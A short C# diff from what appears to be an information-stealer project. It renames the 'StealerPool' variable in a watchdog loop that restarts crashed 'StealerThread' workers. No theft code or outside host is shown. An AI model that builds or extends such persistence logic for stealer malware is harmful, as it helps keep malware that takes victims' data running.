@@ -48,7 +48,7 @@ namespace sub
             {
                 //Implement some kind of checking to make sure none of the threads crashed
                 //Restart them if they did (unless they are meant to run once)
-                foreach (StealerThread st in Variables.stealerPool)
+                foreach (StealerThread st in Variables.StealerPool)
                 {
                     if (st.GetDelay() < 1) continue; //If it is meant to run once, don't revive
                     if (st.GetStealerThread().ThreadState != ThreadState.Running
